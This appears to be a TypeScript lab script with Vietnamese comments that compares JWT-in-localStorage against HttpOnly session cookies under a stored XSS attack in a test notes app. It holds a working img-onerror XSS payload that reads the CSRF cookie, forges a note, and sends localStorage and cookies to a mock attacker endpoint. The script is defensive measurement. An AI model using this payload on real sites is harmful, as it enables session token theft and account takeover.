// Đo "trước/sau" trên trình duyệt thật (Google Chrome hệ thống, headless, profile tạm): script XSS (payload của
// chính lab, chỉ gửi về endpoint "kẻ tấn công" giả trong lab) chạy trên trang ghi chú không sanitize.
//   - Bản TRƯỚC (JWT localStorage): payload đọc được token, gửi ra ngoài → chiếm được tài khoản lâu dài.
//   - Bản SAU (session cookie HttpOnly): payload KHÔNG đọc được id phiên (document.cookie không có __Host-sid),
//     nhưng VẪN gửi được request cùng phiên (tạo ghi chú) — HttpOnly không chặn việc đó.
// Kèm kiểm: Chrome 154 có chấp nhận cookie Secure/__Host- qua http://localhost không.
import { Pool } from 'pg';
import { hashPassword } from '../src/shared/password';
import { SEED_USERS } from '../src/shared/seed-users';
import { API, benchSecrets, ensureWebBuild, launchChrome, machineState, sleep, startApi, startWeb, WEB, writeResult } from './lib/lab';

const DB_URL = process.env.DATABASE_URL ?? 'postgres://app:app@localhost:55432/crm';

// Payload XSS của lab: img onerror (script-tag chèn qua innerHTML không chạy, img onerror thì chạy).
const XSS_PAYLOAD = `<img src="x" data-xss="1" onerror="(function(){try{fetch('/api/_attacker/collect',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({localStorage:JSON.stringify(window.localStorage),documentCookie:document.cookie})});}catch(e){}try{var m=document.cookie.match(/(?:^|; )csrf=([^;]+)/);var csrf=m?decodeURIComponent(m[1]):'';fetch('/api/sau/notes',{method:'POST',credentials:'include',headers:{'content-type':'application/json','X-CSRF-Token':csrf},body:JSON.stringify({body:'[XSS] ghi chu do script chen tao ra'})});}catch(e){}})()">`;

async function ensureSeed(pool: Pool) {
  await pool.query('DELETE FROM notes');
  await pool.query('DELETE FROM users');
  for (const u of SEED_USERS)
    await pool.query('INSERT INTO users (email, display_name, password_hash, locked) VALUES ($1,$2,$3,false)', [u.email, u.displayName, hashPassword(u.password)]);
}

/** Bob (kẻ tấn công) chèn ghi chú độc qua /truoc (đơn giản, không cần CSRF). Trả về số ghi chú hiện có. */
async function plantPoisonNote(): Promise<void> {
  const token = await bobToken();
  await fetch(`${API}/truoc/notes`, { method: 'POST', headers: { 'content-type': 'application/json', authorization: `Bearer ${token}` }, body: JSON.stringify({ body: XSS_PAYLOAD }) });
}

const loot = () => fetch(`${API}/_attacker/loot`).then((r) => r.json()) as Promise<{ localStorage: string | null; documentCookie: string | null }[]>;
const resetLoot = () => fetch(`${API}/_attacker/reset`, { method: 'POST' });

async function bobToken(): Promise<string> {
  const bob = SEED_USERS[1]!;
  const r = await fetch(`${API}/truoc/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email: bob.email, password: bob.password }) });
  return ((await r.json()) as { token: string }).token;
}

async function notesCount(): Promise<number> {
  const token = await bobToken();
  const list = (await (await fetch(`${API}/truoc/notes`, { headers: { authorization: `Bearer ${token}` } })).json()) as unknown[];
  return list.length;
}

async function waitLoot(min = 1, timeoutMs = 8000) {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const l = await loot();
    if (l.length >= min || Date.now() > deadline) return l;
    await sleep(150);
  }
}

async function main() {
  const pool = new Pool({ connectionString: DB_URL });
  const started = machineState();
  const build = ensureWebBuild();
  if (build.built) console.log(`next build web: ${build.seconds}s (hash ${build.hash})`);
  const api = await startApi(benchSecrets());
  const web = await startWeb();
  const browser = await launchChrome();
  const result: Record<string, unknown> = { at: new Date().toISOString(), machine: { started, ended: null }, browserVersion: browser.version() };

  try {
    // ---------- BẢN TRƯỚC: JWT trong localStorage ----------
    await ensureSeed(pool);
    await plantPoisonNote();
    await resetLoot();
    {
      const ctx = await browser.newContext();
      const page = await ctx.newPage();
      await page.goto(`${WEB}/truoc`);
      await page.fill('[data-testid="email"]', SEED_USERS[0]!.email);
      await page.fill('[data-testid="password"]', SEED_USERS[0]!.password);
      await page.click('button[type="submit"]');
      await page.waitForSelector('[data-testid="note"]', { timeout: 15000 });
      const l = await waitLoot(1);
      const ls = l[0]?.localStorage ?? '{}';
      const tokenStolen = /"jwt"\s*:/.test(ls) && ls.includes('eyJ'); // JWT bắt đầu bằng eyJ
      const pageLocalStorage = await page.evaluate(() => JSON.stringify(window.localStorage));
      result.truoc = {
        lootCount: l.length,
        stolenLocalStorage: ls.slice(0, 80) + (ls.length > 80 ? '…' : ''),
        stolenCookie: l[0]?.documentCookie ?? '',
        tokenStolen,
        pageHasTokenInLocalStorage: /"jwt"/.test(pageLocalStorage),
      };
      await ctx.close();
    }

    // ---------- BẢN SAU: session cookie __Host-sid ----------
    await ensureSeed(pool);
    await plantPoisonNote();
    await resetLoot();
    const notesBefore = await notesCount();
    {
      const ctx = await browser.newContext();
      const page = await ctx.newPage();
      await page.goto(`${WEB}/sau`);
      await page.fill('[data-testid="email"]', SEED_USERS[0]!.email);
      await page.fill('[data-testid="password"]', SEED_USERS[0]!.password);
      await page.click('button[type="submit"]');
      await page.waitForSelector('[data-testid="note"]', { timeout: 15000 });
      const l = await waitLoot(1);
      const ls = l[0]?.localStorage ?? '{}';
      const stolenCookie = l[0]?.documentCookie ?? '';
      const docCookieInPage = await page.evaluate(() => document.cookie);
      const cookies = await ctx.cookies();
      const sid = cookies.find((c) => c.name === '__Host-sid');
      await sleep(400); // chờ request tạo ghi chú cùng phiên
      const notesAfter = await notesCount();
      result.sau = {
        lootCount: l.length,
        stolenLocalStorage: ls,
        stolenCookie,
        sidInStolenCookie: /__Host-sid/.test(stolenCookie),
        sidInDocumentCookie: /__Host-sid/.test(docCookieInPage),
        tokenStolen: /eyJ/.test(ls) || /__Host-sid/.test(stolenCookie),
        // Chrome chấp nhận cookie Secure/__Host- qua http://localhost?
        hostCookieStoredByChrome: Boolean(sid),
        hostCookieSecureFlag: sid?.secure ?? null,
        hostCookieHttpOnlyFlag: sid?.httpOnly ?? null,
        // HttpOnly KHÔNG chặn request cùng phiên:
        inSessionActionSucceeded: notesAfter > notesBefore,
        notesBefore,
        notesAfter,
      };
      await ctx.close();
    }

    result.machine = { started, ended: machineState() };
    const file = writeResult('xss.json', result);
    console.log(JSON.stringify(result, null, 2));
    console.log(`\nĐã ghi ${file}`);
  } finally {
    await browser.close();
    await web.stop();
    await api.stop();
    await pool.end();
  }
}

await main();
